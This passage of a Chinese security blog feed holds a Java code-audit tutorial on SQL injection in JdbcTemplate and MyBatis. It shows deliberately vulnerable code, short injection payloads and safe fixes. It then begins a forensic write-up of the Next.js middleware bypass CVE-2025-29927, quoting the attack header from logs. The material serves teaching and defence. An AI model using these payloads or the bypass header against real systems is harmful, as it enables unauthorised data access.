对 JDBC 的封装,供了直接编写查询的方法</p><p>spring JdbcTemplate 类的方法</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>public int update(String query)</td><td>用于插入，更新和删除记录。</td></tr><tr><td>public int update(String query，Object … args)</td><td>用于通过使用给定参数的PreparedStatement插入，更新和删除记录。</td></tr><tr><td>public void execute(String query)</td><td>用于执行DDL查询。</td></tr><tr><td>public T execute(String sql, PreparedStatementCallback action)</td><td>通过使用PreparedStatement回调执行查询。</td></tr><tr><td>public T query(String sql, ResultSetExtractor rse)</td><td>用于使用ResultSetExtractor获取记录。</td></tr><tr><td>public List query(String sql, RowMapper rse)</td><td>用于使用RowMapper获取记录。</td></tr></tbody></table><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">vul3</span><span class="hljs-params">(String id)</span> &#123;<br>    <span class="hljs-type">DriverManagerDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DriverManagerDataSource</span>();<br>    dataSource.setDriverClassName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    dataSource.setUrl(db_url);<br>    dataSource.setUsername(db_user);<br>    dataSource.setPassword(db_pass);<br><br>    <span class="hljs-type">JdbcTemplate</span> <span class="hljs-variable">jdbctemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br><br>    <span class="hljs-comment">// 安全代码：使用参数化查询，避免SQL注入风险</span><br>    <span class="hljs-comment">// String sql = &quot;select * from users where id = ?&quot;;</span><br><br>    <span class="hljs-keyword">return</span> jdbctemplate.queryForMap(sql);<br>&#125;<br></code></pre></td></tr></table></figure><p>又是对输入的字段直接进行拼接，形成了 sql 注入</p><p><img src="https://img.dkdun.cn/v1/2025/12/58b504c4d8510b6d.png"></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5675882969d08cc6.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/4ea9b0ec08c2b8ae.png"></p><p>sql 语句就变成了这样，直接拼接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="强制数据类型"><a href="#强制数据类型" class="headerlink" title="强制数据类型"></a>强制数据类型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">safe4</span><span class="hljs-params">(Integer id)</span> &#123;<br>    <span class="hljs-type">DriverManagerDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DriverManagerDataSource</span>();<br>    dataSource.setDriverClassName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    dataSource.setUrl(db_url);<br>    dataSource.setUsername(db_user);<br>    dataSource.setPassword(db_pass);<br><br>    <span class="hljs-type">JdbcTemplate</span> <span class="hljs-variable">jdbctemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTemplate</span>(dataSource);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql_vul</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br><br>    <span class="hljs-keyword">return</span> jdbctemplate.queryForMap(sql_vul);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果参数类型为 <code>boolean、byte、short、int、long、float、double</code> 等 sql 语句就无法拼接字符串</p><p>代码中会把传入的参数强制转换成 <code>Integer</code> 类型，所以如果是输入了像单引号 <code>&#39;</code>  这种字符，就会导致类型转换失败，比如当我输入了一个 <code>1&#39;</code> 就会出如下报错</p><p><img src="https://img.dkdun.cn/v1/2025/12/68e50b528ef960a7.png"></p><h2 id="ESAPI框架"><a href="#ESAPI框架" class="headerlink" title="ESAPI框架"></a>ESAPI框架</h2><p>The OWASP Enterprise Security API，一款开源 Web 应用程序安全控制库，简单来说就是为了编写出更加安全的代码而设计出来的一些API，方便使用者调用，从而方便的编写安全的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safe3</span><span class="hljs-params">(String id)</span> &#123;<br>    Codec&lt;Character&gt; oracleCodec = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCodec</span>();<br><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &#x27;&quot;</span> + ESAPI.encoder().encodeForSQL(oracleCodec, id) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>encodeForSQL</code> 方法还对输入的特殊字符进行了转义处理，比如单引号 <code>&#39;</code> 会被转义为 <code>&quot;</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/69a35c24c9b56109.png"></p><h2 id="正则过滤"><a href="#正则过滤" class="headerlink" title="正则过滤"></a>正则过滤</h2><p>比如说只匹配字母和数字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safe5</span><span class="hljs-params">(String name)</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">isValid</span> <span class="hljs-operator">=</span> Pattern.matches(pattern, name);<br><br>    <span class="hljs-keyword">if</span> (isValid) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user = &#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;非法正则匹配！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>name</code> 的值必须要等于一个数据库中有的数据，有效预防了注入</p><p><img src="https://img.dkdun.cn/v1/2025/12/74a329f6940b82a2.png"></p><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>由于使用 <code>$&#123;&#125;</code> 直接拼接数据，从而造成SQL注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/vul/order&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">orderBy</span><span class="hljs-params">(String field, String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.orderBy(field, sort);<br>&#125;<br><br><span class="hljs-comment">// 不安全的注解写法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-meta">@Select(&quot;select * from users order by $&#123;field&#125; $&#123;sort&#125;&quot;)</span><br>    List&lt;User&gt; <span class="hljs-title function_">orderBy</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;field&quot;)</span> String field, <span class="hljs-meta">@Param(&quot;sort&quot;)</span> String sort)</span>;<br>&#125;<br><br><span class="hljs-comment">// 不安全的XML映射写法</span><br>&lt;select id=<span class="hljs-string">&quot;orderBy&quot;</span> resultType=<span class="hljs-string">&quot;com.best.hello.entity.User&quot;</span>&gt;<br>    select * from users order by $&#123;field&#125; $&#123;sort&#125;<br>&lt;/select&gt;<br></code></pre></td></tr></table></figure><p>可以看到代码中调用了 <code>userMapper</code> 接口中的 <code>orderBy</code> 方法，传入参数 <code>file</code> 和 <code>sort</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b4b38ecd1d3a048e.png"></p><p><code>userMapper</code> 接口的 <code>orderBy</code> 方法通常实现在 MyBatis 的 XML 映射文件或注解中</p><h4 id="注解形式"><a href="#注解形式" class="headerlink" title="注解形式"></a>注解形式</h4><p>可以发现在 <code>mapper</code> 文件夹下的 <code>UserMapper</code> 接口中，<code>orderBy</code> 方法在注解中的定义使用了 <code>$&#123;&#125;</code> 语法</p><p><img src="https://img.dkdun.cn/v1/2025/12/33d089e6180ffc4f.png"></p><p><code>$&#123;&#125;</code> 是一个简单的 String 替换，字符串是什么，解析就是什么，假如传的参数是 <code>id</code> (假设 <code>id</code>是 String 类型)，对于 <code>order by #&#123;id&#125;</code> ，对应的 sql 语句就是 <code>order by &quot;id&quot;</code>，对于 <code>order by $&#123;id&#125;</code>，对应的 sql 语句则是 <code>order by id</code>，因此在这里传入的  <code>field=3&amp;sort=desc,abs(111111)</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c33b20dfde45f4a4.png"></p><p>会被完整插入语句中，然后生成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-keyword">desc</span>,<span class="hljs-built_in">abs</span>(<span class="hljs-number">111111</span>)<br></code></pre></td></tr></table></figure><p>从而得到数据库中的数据</p><h4 id="XML-文件形式"><a href="#XML-文件形式" class="headerlink" title="XML 文件形式"></a>XML 文件形式</h4><p>同样 <code>oberBy</code> 方法在 xml 文件中的映射使用了 <code>$&#123;&#125;</code> 语法，找到 <code>UserMapper.xml</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/1a43e8d63d75b18a.png"></p><p>采用了 <code>$&#123;&#125;</code> 语法，造成了注入</p><h3 id="排序映射"><a href="#排序映射" class="headerlink" title="排序映射"></a>排序映射</h3><p>采用排序映射的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/order&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">orderBySafe</span><span class="hljs-params">(String field)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.orderBySafe(field);<br>&#125;<br><br>&lt;mapper namespace=<span class="hljs-string">&quot;com.best.hello.mapper.UserMapper&quot;</span>&gt;<br>    &lt;select id=<span class="hljs-string">&quot;orderBySafe&quot;</span> resultType=<span class="hljs-string">&quot;com.best.hello.entity.User&quot;</span>&gt;<br>        select * from users<br>        &lt;choose&gt;<br>            &lt;!-- 根据字段选择排序方式，避免 SQL 注入 --&gt;<br>            &lt;when test=<span class="hljs-string">&quot;field == &#x27;id&#x27;&quot;</span>&gt;<br>                order by id desc<br>            &lt;/when&gt;<br>            &lt;when test=<span class="hljs-string">&quot;field == &#x27;user&#x27;&quot;</span>&gt;<br>                order by user desc<br>            &lt;/when&gt;<br>            &lt;otherwise&gt;<br>                &lt;!-- 默认排序方式，防止不合法输入 --&gt;<br>                order by id asc limit <span class="hljs-number">1</span><br>            &lt;/otherwise&gt;<br>        &lt;/choose&gt;<br>    &lt;/select&gt;<br>&lt;/mapper&gt;<br>                    <br></code></pre></td></tr></table></figure><p>可以发现用户输入的值只能是 <code>id</code> 或 <code>user</code> 时拼接字段执行其规则，其余直接限制了输出</p><p>比如当输入 <code>field=idd</code> 时，只显示出 id&#x3D;1 和 2 的数据表</p><p><img src="https://img.dkdun.cn/v1/2025/12/a71b9bbcaef60019.png"></p><h3 id="order-by-正则过滤"><a href="#order-by-正则过滤" class="headerlink" title="order by 正则过滤"></a>order by 正则过滤</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">orderBySafeRe</span><span class="hljs-params">(String field, String sort)</span> &#123;<br>    <span class="hljs-keyword">if</span> (Security.isValidOrder(field) &amp;&amp; Security.isValidSort(sort)) &#123;<br>        <span class="hljs-keyword">return</span> userMapper.orderBy2(field, sort);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.orderBy2(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;desc&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 正则表达式验证排序字段是否仅包含数字、字母、加号或下划线</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidOrder</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-keyword">return</span> content.matches(<span class="hljs-string">&quot;[0-9a-zA-Z+_]+&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 白名单验证排序顺序，只允许 &quot;desc&quot; 和 &quot;asc&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidSort</span><span class="hljs-params">(String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;desc&quot;</span>.equalsIgnoreCase(sort) || <span class="hljs-string">&quot;asc&quot;</span>.equalsIgnoreCase(sort);<br>&#125;<br></code></pre></td></tr></table></figure><p>字段名只允许通过数字字母下划线加号，顺序排序只允许 <code>asc</code> 和 <code>dsc</code></p><h2 id="搜索注入"><a href="#搜索注入" class="headerlink" title="搜索注入"></a>搜索注入</h2><p>由于在 <code>LIKE</code> 查询中使用 <code>&#39;%$&#123;user&#125;%&#39;</code> 导致 SQL 注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/vul/search&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">searchVul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;user&quot;)</span> String user)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.searchVul(user);<br>&#125;<br><br><span class="hljs-comment">// 不安全的注解</span><br><span class="hljs-meta">@Select(&quot;select * from users where user like &#x27;%$&#123;q&#125;%&#x27;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">search</span><span class="hljs-params">(String q)</span>;<br></code></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>发现输入的值被复制给参数 <code>user</code>，然后使用 <code>searchVul()</code> 方法进行操作，跟进 <code>searchVul()</code> 方法</p><p><img src="https://img.dkdun.cn/v1/2025/12/f0d344afa0bf9f95.png"></p><p> <code>searchVul()</code> 方法采用了 <code>&#39;%$&#123;user&#125;%&#39;</code> 方式进行语句拼接，因为使用了 <code>$&#123;&#125;</code> 语法，所以输入并没有经过任何处理</p><p><img src="https://img.dkdun.cn/v1/2025/12/79038f4a68b673ee.png"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">t%&#x27; or 1=1 and &#x27;%&#x27;=&#x27;<br></code></pre></td></tr></table></figure><p>这时候，sql 语句就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%t%&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;%&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;%&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="参数化"><a href="#参数化" class="headerlink" title="#{} 参数化"></a>#{} 参数化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/search&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">searchSafe</span><span class="hljs-params">(String user)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.searchSafe(user);<br>&#125;<br><br><span class="hljs-comment">// 使用 MyBatis 注解的安全查询方法</span><br><span class="hljs-meta">@Select(&quot;select * from users where user like CONCAT(&#x27;%&#x27;, #&#123;user&#125;, &#x27;%&#x27;)&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">queryByUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;user&quot;)</span> String user)</span>;<br></code></pre></td></tr></table></figure><p>可以看到采用了 <code>CONCAT</code> 来进行模糊查询，拼接两个 <code>%</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/5d6b21859232485e.png"></p><h3 id="强制数据类型-1"><a href="#强制数据类型-1" class="headerlink" title="强制数据类型"></a>强制数据类型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/id/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Integer id)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.queryByIdAsInterger(id);<br>&#125;<br><br><span class="hljs-meta">@Select(&quot;select * from users where id = $&#123;id&#125;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">queryByIdAsInterger</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> Integer id)</span>;<br></code></pre></td></tr></table></figure><p>强制使用 <code>Integer</code>类型，导致无法注入</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f0187b6c360233c.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
      <category>Hello-Java-Sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-NeuroSync-D</title>
    <link href="/2025/04/14/HTB-NeuroSync-D/"/>
    <url>/2025/04/14/HTB-NeuroSync-D/</url>
    
    <content type="html"><![CDATA[<p>关于 Next.js 中间件鉴权绕过的漏洞</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.</p><h1 id="使用的-Next-js-版本"><a href="#使用的-Next-js-版本" class="headerlink" title="使用的 Next.js 版本"></a>使用的 Next.js 版本</h1><p>在 <code>interface.log</code> 文件中找到 Next.js 版本号</p><p><img src="https://img.dkdun.cn/v1/2025/12/e8deead847d7f189.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">15</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="Next-js-本地运行端口"><a href="#Next-js-本地运行端口" class="headerlink" title="Next.js 本地运行端口"></a>Next.js 本地运行端口</h1><p><img src="https://img.dkdun.cn/v1/2025/12/09b3a46e3310b504.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><h1 id="符和此版本的-Next-js-的-CVE-编号"><a href="#符和此版本的-Next-js-的-CVE-编号" class="headerlink" title="符和此版本的 Next.js 的 CVE 编号"></a>符和此版本的 Next.js 的 CVE 编号</h1><p><a href="https://www.cnblogs.com/CVE-Lemon/p/18789173">CVE-2025-29927 Next.js 中间件权限绕过漏洞</a>，通过添加 <code>x-middleware-subrequest</code> 请求头绕过中间件安全控制</p><p><img src="https://img.dkdun.cn/v1/2025/12/05516e87ef1fd463.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2025</span>-<span class="hljs-number">29927</span><br></code></pre></td></tr></table></figure><h1 id="通过枚举-Next-js-框架中的文件得到的第一个文件"><a href="#通过枚举-Next-js-框架中的文件得到的第一个文件" class="headerlink" title="通过枚举 Next.js 框架中的文件得到的第一个文件"></a>通过枚举 Next.js 框架中的文件得到的第一个文件</h1><p>在 <code>access.log</code> 文件中查找 HTTP 状态码为 200 的请求信息，第一个文件为 <code>main-app.js</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b5575411c2ba5ce3.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>-app<span class="hljs-selector-class">.js</span><br></code></pre></td></tr></table></figure><h1 id="受漏洞影响的-endpoint"><a href="#受漏洞影响的-endpoint" class="headerlink" title="受漏洞影响的 endpoint"></a>受漏洞影响的 endpoint</h1><p>查看 <code>interface.log</code> 文件可以发现对  <code>http://localhost:3000/api/bci/analytics</code> 请求了多次，并且使用了 <code>x-middleware-subrequest</code> 请求头</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">2025-04-01T11:37:59.699Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [[&quot;accept&quot;,&quot;*/*&quot;],[&quot;accept-encoding&quot;,&quot;gzip, deflate, br&quot;],[&quot;connection&quot;,&quot;close&quot;],[&quot;host&quot;,&quot;10.129.231.215&quot;],[&quot;user-agent&quot;,&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0&quot;],[&quot;x-forwarded-for&quot;,&quot;10.129.231.211&quot;],[&quot;x-forwarded-host&quot;,&quot;10.129.231.215&quot;],[&quot;x-forwarded-port&quot;,&quot;3000&quot;],[&quot;x-forwarded-proto&quot;,&quot;http&quot;],[&quot;x-middleware-subrequest&quot;,&quot;middleware&quot;],[&quot;x-real-ip&quot;,&quot;10.129.231.211&quot;]]<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/eea8e602f2f610ba.png"></p><p>所以 endpoint 为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/api/</span>bci/analytics<br></code></pre></td></tr></table></figure><h1 id="漏洞导致的未授权响应数量"><a href="#漏洞导致的未授权响应数量" class="headerlink" title="漏洞导致的未授权响应数量"></a>漏洞导致的未授权响应数量</h1><p>可以看到请求从 <code>2025-04-01 11:37:58</code> 开始到 <code>2025-04-01 11:38:04</code> 结束</p><p><img src="https://img.dkdun.cn/v1/2025/12/3bc95d55c7645f56.png"></p><p>从 <code>access.log</code> 查找此时间段信息发现 HTTP 状态码全为 401，这样的请求信息有 5 条</p><p><img src="https://img.dkdun.cn/v1/2025/12/8e1d1ccc558c8a51.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">5<br></code></pre></td></tr></table></figure><h1 id="中间件被成功绕过的时间"><a href="#中间件被成功绕过的时间" class="headerlink" title="中间件被成功绕过的时间"></a>中间件被成功绕过的时间</h1><p> 401 请求响应后一条状态码变为了 200，说明已经被成功绕过</p><p><img src="https://img.dkdun.cn/v1/2025/12/7c1d5e98c3054393.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">01</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">05</span><br></code></pre></td></tr></table></figure><h1 id="绕过中间件的标头的值"><a href="#绕过中间件的标头的值" class="headerlink" title="绕过中间件的标头的值"></a>绕过中间件的标头的值</h1><p><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">Next.js and the corrupt middleware: the authorizing artifact</a>，这篇文章中有对各版本更深入的研究</p><p>查看 <a 